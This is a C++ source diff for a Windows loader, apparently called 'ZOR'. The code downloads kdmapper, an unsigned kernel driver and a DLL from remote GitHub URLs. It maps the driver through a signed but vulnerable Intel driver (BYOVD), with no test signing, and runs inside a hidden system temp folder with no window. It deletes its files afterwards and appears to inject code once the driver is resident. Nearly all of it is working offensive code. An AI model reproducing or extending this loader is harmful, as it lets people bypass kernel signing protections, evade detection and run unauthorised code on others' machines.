@@ -103,7 +103,6 @@ static const wchar_t* g_remoteDllUrl   = L"https://raw.githubusercontent.com/YOU
 
 static const wchar_t* g_remoteKdmapperUrl = L"https://raw.githubusercontent.com/YOUR_USER/YOUR_REPO/main/Tools/kdmapper/kdmapper.exe";
 
-static const wchar_t* g_remoteVulnDrvUrl = L"https://raw.githubusercontent.com/YOUR_USER/YOUR_REPO/main/Tools/kdmapper/iqvw64e.sys";
 static bool DownloadToMemory(const wchar_t* url, std::vector<BYTE>& out) {
     out.clear();
     HINTERNET hSession = WinHttpOpen(L"ZORUpdater/1.0",
@@ -205,9 +204,9 @@ static DebugLogger* g_Debug = nullptr;
 
 // ============================================================================
 //  kdmapper: map unsigned driver via a signed-but-vulnerable driver (BYOVD).
-//  kdmapper + vulnerable driver + target .sys all land in one hidden temp dir,
-//  then the device is polled; every file is deleted when done. No SCM, no
-//  test signing required.
+//  kdmapper.exe embeds iqvw64e.sys itself. It is dropped with the target .sys
+//  in one hidden temp dir, run, and the \\.\ZOR device is polled; everything
+//  is deleted when done. No SCM, no test signing required.
 // ============================================================================
 static bool ZORDeviceExists() {
     HANDLE h = CreateFileW(L"\\\\.\\ZOR", GENERIC_READ | GENERIC_WRITE,
@@ -228,32 +227,30 @@ static bool WriteAllBytes(const std::wstring& path, const std::vector<BYTE>& dat
 }
 
 static bool MapViaKdmapper(const std::vector<BYTE>& kdmapperData,
-                           const std::vector<BYTE>& vulnDrvData,
                            const std::vector<BYTE>& driverData) {
     wchar_t tempDir[MAX_PATH];
     if (!GetTempPathW(MAX_PATH, tempDir)) return false;
 
-    // Unique hidden subfolder so kdmapper + vuln driver sit side by side.
+    // Unique hidden subfolder.
     std::wstring dir = std::wstring(tempDir) + L"ns" + std::to_wstring(GetTickCount()) +
         L"_" + std::to_wstring(rand() % 100000) + L"\\";
     if (!CreateDirectoryW(dir.c_str(), NULL)) return false;
     SetFileAttributesW(dir.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
 
     std::wstring kdmPath = dir + L"kdmapper.exe";
-    std::wstring vulnPath = dir + L"iqvw64e.sys";
     std::wstring drvPath = dir + L"nxs_drv.sys";
 
     bool ok = WriteAllBytes(kdmPath, kdmapperData) &&
-              WriteAllBytes(vulnPath, vulnDrvData) &&
               WriteAllBytes(drvPath, driverData);
     if (!ok) {
-        DeleteFileW(kdmPath.c_str()); DeleteFileW(vulnPath.c_str()); DeleteFileW(drvPath.c_str());
+        DeleteFileW(kdmPath.c_str()); DeleteFileW(drvPath.c_str());
         RemoveDirectoryW(dir.c_str());
         return false;
     }
 
-    // kdmapper <driver.sys> [original_driver] -- clean up after itself.
-    std::wstring cmd = L"\"" + kdmPath + L"\" \"" + drvPath + L"\" \"" + vulnPath + L"\" -d";
+    // Keep the driver mapped (no --free) so \\.\ZOR stays resident for inject.
+    // --copy-header gives a valid driver header which keeps our own PE checks happy.
+    std::wstring cmd = L"\"" + kdmPath + L"\" --copy-header \"" + drvPath + L"\"";
     STARTUPINFOW si = { sizeof(si) };
     PROCESS_INFORMATION pi = {};
     si.dwFlags = STARTF_USESHOWWINDOW;
@@ -262,12 +259,12 @@ static bool MapViaKdmapper(const std::vector<BYTE>& kdmapperData,
         CREATE_NO_WINDOW, NULL, dir.c_str(), &si, &pi);
     if (!launched) {
         g_Debug->LogError("kdmapper CreateProcessW", GetLastError());
-        DeleteFileW(kdmPath.c_str()); DeleteFileW(vulnPath.c_str()); DeleteFileW(drvPath.c_str());
+        DeleteFileW(kdmPath.c_str()); DeleteFileW(drvPath.c_str());
         RemoveDirectoryW(dir.c_str());
         return false;
     }
 
-    // Wait for \\.\ZOR to appear (kdmapper + driver start, unload, delete -d).
+    // Wait for \\.\ZOR to appear (kdmapper loads, maps, calls DriverEntry).
     bool mapped = false;
     for (int i = 0; i < 120; i++) {
         if (ZORDeviceExists()) { mapped = true; break; }
@@ -277,9 +274,8 @@ static bool MapViaKdmapper(const std::vector<BYTE>& kdmapperData,
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
 
-    // Cleanup: kdmapper -d removes the .sys it mapped; remove the rest.
+    // Cleanup: remove kdmapper + the driver file it mapped from temp.
     DeleteFileW(kdmPath.c_str());
-    DeleteFileW(vulnPath.c_str());
     DeleteFileW(drvPath.c_str());
     RemoveDirectoryW(dir.c_str());
     g_Debug->Log(mapped ? "[+] Driver mapped via kdmapper" : "[!] kdmapper did not produce \\\\.\\ZOR");
@@ -468,11 +464,10 @@ DWORD WINAPI InjectThread(LPVOID) {
     g_working = true;
     g_injected = false;
 
-    // Fetch all three pieces from GitHub into memory (no disk until mapped).
-    std::vector<BYTE> remoteDrv, kdmData, vulnData, remoteDll;
+    // Fetch everything from GitHub into memory (no disk until mapped).
+    std::vector<BYTE> remoteDrv, kdmData, remoteDll;
     bool haveDrvBytes  = DownloadToMemory(g_remoteDriverUrl, remoteDrv);
     bool haveKdmapper  = DownloadToMemory(g_remoteKdmapperUrl, kdmData);
-    bool haveVulnDrv   = DownloadToMemory(g_remoteVulnDrvUrl, vulnData);
     bool haveRemoteDll = DownloadToMemory(g_remoteDllUrl, remoteDll);
 
     std::string dllPath;
@@ -494,10 +489,10 @@ DWORD WINAPI InjectThread(LPVOID) {
     std::wstring droppedDriver;
 
     // Preferred: kdmapper (BYOVD) -- works without test signing, driver stays in
-    // memory, all files deleted. Requires all 3 remote files to be present.
-    if (haveDrvBytes && haveKdmapper && haveVulnDrv) {
+    // memory, all files deleted. kdmapper.exe embeds iqvw64e.sys itself.
+    if (haveDrvBytes && haveKdmapper) {
         g_Debug->Log("Mapping driver via kdmapper (BYOVD)...");
-        driverReady = MapViaKdmapper(kdmData, vulnData, remoteDrv);
+        driverReady = MapViaKdmapper(kdmData, remoteDrv);
         if (driverReady) {
             g_cards[0].state = ST_OK; g_cards[0].detail = L"Mapped";
             g_Debug->Log("[+] Driver mapped via kdmapper");
